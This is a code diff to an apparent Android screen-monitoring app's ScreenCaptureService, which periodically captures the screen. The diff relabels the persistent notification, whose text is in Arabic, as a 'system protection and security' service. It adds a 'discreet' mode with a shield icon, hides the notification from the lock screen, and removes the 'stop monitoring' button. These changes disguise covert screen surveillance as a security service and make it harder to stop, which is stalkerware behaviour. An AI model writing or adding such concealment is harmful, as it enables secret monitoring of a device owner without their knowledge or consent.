@@ -28,6 +28,7 @@ import androidx.core.app.NotificationCompat
 import androidx.core.app.ServiceCompat
 import androidx.core.content.ContextCompat
 import com.example.screenmonitor.MainActivity
+import com.example.screenmonitor.R
 import com.example.screenmonitor.data.InsufficientStorageException
 import com.example.screenmonitor.data.PreferencesManager
 import com.example.screenmonitor.data.ScreenshotRepository
@@ -117,6 +118,13 @@ class ScreenCaptureService : Service() {
             ACTION_UPDATE_INTERVAL -> {
                 if (mediaProjection != null && preferencesManager.isMonitoringActive && isScreenOn()) {
                     startCaptureLoop()
+                }
+            }
+            ACTION_UPDATE_NOTIFICATION -> {
+                if (mediaProjection != null) {
+                    val notification = buildNotification("مراقبة الشاشة نشطة")
+                    val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+                    manager.notify(NOTIFICATION_ID, notification)
                 }
             }
             else -> {
@@ -480,11 +488,12 @@ class ScreenCaptureService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "خدمة مراقبة الشاشة",
+                "خدمات حماية وأمان النظام",
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "إشعار مستمر يوضح تشغيل التقاط الشاشة الدوري"
+                description = "خدمة خلفية مستمرة لأمان وحماية النظام"
                 setShowBadge(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
             val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             manager.createNotificationChannel(channel)
@@ -492,6 +501,10 @@ class ScreenCaptureService : Service() {
     }
 
     private fun buildNotification(contentText: String): Notification {
+        val isDiscreet = preferencesManager.isDiscreetNotificationEnabled
+        val title = if (isDiscreet) "خدمة حماية النظام" else "مراقبة الشاشة قيد التشغيل"
+        val text = if (isDiscreet) "خدمة الأمان تعمل بشكل طبيعي في الخلفية" else contentText
+
         val openAppIntent = Intent(this, MainActivity::class.java).apply {
             flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
         }
@@ -502,25 +515,15 @@ class ScreenCaptureService : Service() {
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
 
-        val stopIntent = Intent(this, ScreenCaptureService::class.java).apply {
-            action = ACTION_STOP
-        }
-        val pendingStop = PendingIntent.getService(
-            this,
-            1,
-            stopIntent,
-            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-        )
-
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("مراقبة الشاشة قيد التشغيل")
-            .setContentText(contentText)
-            .setSmallIcon(android.R.drawable.ic_menu_camera)
+            .setContentTitle(title)
+            .setContentText(text)
+            .setSmallIcon(R.drawable.ic_shield_service)
             .setOngoing(true)
             .setContentIntent(pendingOpenApp)
-            .addAction(android.R.drawable.ic_delete, "إيقاف المراقبة", pendingStop)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
     }
 
@@ -536,6 +539,7 @@ class ScreenCaptureService : Service() {
         const val ACTION_START = "com.example.screenmonitor.action.START"
         const val ACTION_STOP = "com.example.screenmonitor.action.STOP"
         const val ACTION_UPDATE_INTERVAL = "com.example.screenmonitor.action.UPDATE_INTERVAL"
+        const val ACTION_UPDATE_NOTIFICATION = "com.example.screenmonitor.action.UPDATE_NOTIFICATION"
 
         const val EXTRA_RESULT_CODE = "extra_result_code"
         const val EXTRA_RESULT_DATA = "extra_result_data"
